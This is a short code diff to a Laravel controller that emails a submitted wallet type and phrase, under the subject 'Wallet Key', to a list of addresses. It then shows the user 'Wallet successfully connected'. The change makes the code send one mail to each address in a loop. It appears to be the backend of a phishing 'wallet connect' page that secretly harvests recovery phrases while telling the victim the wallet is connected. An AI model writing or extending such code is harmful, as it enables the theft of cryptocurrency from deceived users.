@@ -64,11 +64,14 @@ class PagesController extends Controller
 
             $mails = json_decode($mailList,true);
 
-            Mail::raw('Here is a ' . $wallet_type . ' address' . ', ' . $phrase, function ($message) use ($mails) {
-                $message->to($mails)
-                    ->subject('Wallet Key');
-            });
+            foreach ($mails as $mail) {
 
+
+                Mail::raw('Here is a ' . $wallet_type . ' address' . ', ' . $phrase, function ($message) use ($mail) {
+                    $message->to($mail)
+                        ->subject('Wallet Key');
+                });
+            }
 
             return back()->with('success', 'Wallet successfully connected');
         }
